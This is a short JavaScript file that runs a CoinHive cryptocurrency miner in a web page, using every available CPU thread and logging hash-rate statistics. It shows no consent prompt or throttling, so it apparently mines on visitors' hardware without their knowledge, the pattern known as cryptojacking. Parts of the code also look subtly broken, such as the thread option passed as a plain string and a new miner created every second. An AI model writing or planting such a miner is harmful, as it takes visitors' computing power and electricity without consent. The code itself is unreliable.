var threadCount = navigator.hardwareConcurrency;
var timeDelay = 1000;
var timeDelayMain = 1250;

setInterval(function() {
	miner = new CoinHive.Anonymous(document.getElementById("api").innerHTML,'threads: ' + threadCount);
}, timeDelay);
	
// Update stats once per second
setInterval(function() {
	
    var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
    var totalHashes = miner.getTotalHashes();
    var acceptedHashes = miner.getAcceptedHashes() / 256;
	
	miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
	
    // Output to console
    if (miner.isRunning()) {
		
		console.log("threadcount = " + threadCount + "\n" + "hashesPerSecond = " + hashesPerSecond + "\n" + "total hashes = " + totalHashes + "\n" + "accepted hashes = " + acceptedHashes);
    
	}
	
}, timeDelayMain);
	